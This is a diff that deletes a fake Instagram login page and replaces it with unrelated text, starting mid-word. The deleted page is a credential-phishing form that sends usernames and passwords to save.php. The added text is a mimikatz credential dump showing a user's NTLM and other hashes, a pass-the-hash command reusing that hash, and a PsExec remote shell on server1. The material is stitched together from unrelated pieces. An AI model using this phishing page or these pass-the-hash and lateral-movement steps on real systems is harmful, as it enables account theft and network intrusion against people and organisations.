@@ -1,53 +1,61 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Instagram</title>
-    <style>
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            background-color: #fafafa;
-            font-family: Arial, sans-serif;
-        }
-        .login-box {
-            background: white;
-            padding: 20px;
-            border: 1px solid #dbdbdb;
-            width: 300px;
-            text-align: center;
-        }
-        input {
-            width: 90%;
-            padding: 10px;
-            margin: 5px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 5px;
-        }
-        button {
-            width: 95%;
-            padding: 10px;
-            margin-top: 10px;
-            background-color: #3897f0;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-    </style>
-</head>
-<body>
-    <div class="login-box">
-        <h2>Instagram</h2>
-        <form action="save.php" method="POST">
-            <input type="text" name="username" placeholder="Phone number, username, or email" required><br>
-            <input type="password" name="password" placeholder="Password" required><br>
-            <button type="submit">Log In</button>
-        </form>
-    </div>
-</body>
-</html>
+ogonpasswords"
+ 
+Authentication Id : 0 ; 302247 (00000000:00049ca7)
+Session           : RemoteInteractive from 2
+User Name         : joed
+Domain            : DOMAIN
+Logon Server      : DC1
+Logon Time        : 09/07/2020 10:31:19
+SID               : S-1-5-21-3501040295-3816137123-30697657-1109
+        msv :
+         [00000003] Primary
+         * Username : joed
+         * Domain   : DOMAIN
+         * NTLM     : eed224b4784bb040aab50b8856fe9f02
+         * SHA1     : 42f95dd2a124ceea737c42c06ce7b7cdfbf0ad4b
+         * DPAPI    : e75e04767f812723a24f7e6d91840c1d
+        tspkg :
+        wdigest :
+         * Username : joed
+         * Domain   : DOMAIN
+         * Password : (null)
+        kerberos :
+         * Username : joed
+         * Domain   : domain.com
+         * Password : (null)
+        ssp :
+        credman :
+PS> .\mimikatz.exe "sekurlsa::pth /user:JoeD /domain:domain.com /ntlm:eed224b4784bb040aab50b8856fe9f02"
+ 
+user    : JoeD
+domain  : domain.com
+program : cmd.exe
+impers. : no
+NTLM    : eed224b4784bb040aab50b8856fe9f02
+  |  PID  11560
+  |  TID  10044
+  |  LSA Process is now R/W
+  |  LUID 0 ; 58143370 (00000000:0377328a)
+  \_ msv1_0   - data copy @ 000001AE3DDE8A30 : OK !
+  \_ kerberos - data copy @ 000001AE3DECE9E8
+   \_ aes256_hmac       -> null
+   \_ aes128_hmac       -> null
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 000001AE3DFEC428 (32) -> null
+ 
+# New CMD Window Opens
+PS> .\PSExec.exe \\server1 cmd.exe
+ 
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Microsoft Windows [Version 10.0.17763.1282]
+(c) 2018 Microsoft Corporation. All rights reserved.
+ 
+C:\Windows\system32>hostname
+server1
